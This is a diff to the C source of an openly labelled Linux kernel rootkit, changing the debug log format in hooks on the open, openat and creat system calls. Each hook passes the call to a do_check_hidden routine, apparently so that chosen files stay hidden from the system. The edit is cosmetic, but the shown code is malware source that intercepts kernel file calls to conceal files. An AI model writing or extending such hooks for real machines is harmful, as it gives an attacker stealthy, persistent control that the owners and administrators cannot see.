@@ -12,7 +12,7 @@
 SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                       umode_t, ui16_mode)
 {
-    pr_info("[ROOTKIT] open(%p, %#x, 0%ho)\n", s_filename, i32_flags, ui16_mode);
+    pr_info("[ROOTKIT] open(%p, %s%#x, %#ho)\n", s_filename, SIGNED_ARG(i32_flags), ui16_mode);
 
     return do_check_hidden(orig_open, p_regs, AT_FDCWD, s_filename,
                            i32_flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
@@ -22,7 +22,8 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
 SYSCALL_HOOK_HANDLER4(openat, orig_openat, p_regs, int, i32_dfd, const char __user *, s_filename,
                       int, i32_flags, umode_t, ui16_mode)
 {
-    pr_info("[ROOTKIT] openat(%d, %p, %#x, 0%ho)\n", i32_dfd, s_filename, i32_flags, ui16_mode);
+    pr_info("[ROOTKIT] openat(%d, %p, %s%#x, %#ho)\n", i32_dfd, s_filename, SIGNED_ARG(i32_flags),
+            ui16_mode);
 
     return do_check_hidden(orig_openat, p_regs, i32_dfd, s_filename,
                            i32_flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
@@ -56,7 +57,7 @@ SYSCALL_HOOK_HANDLER4(openat2, orig_openat2, p_regs, int, i32_dfd, const char __
 SYSCALL_HOOK_HANDLER2(creat, orig_creat, p_regs, const char __user *, s_filename, umode_t,
                       ui16_mode)
 {
-    pr_info("[ROOTKIT] creat(%p, 0%ho)\n", s_filename, ui16_mode);
+    pr_info("[ROOTKIT] creat(%p, %#ho)\n", s_filename, ui16_mode);
 
     return do_check_hidden(orig_creat, p_regs, AT_FDCWD, s_filename, 0);
 }
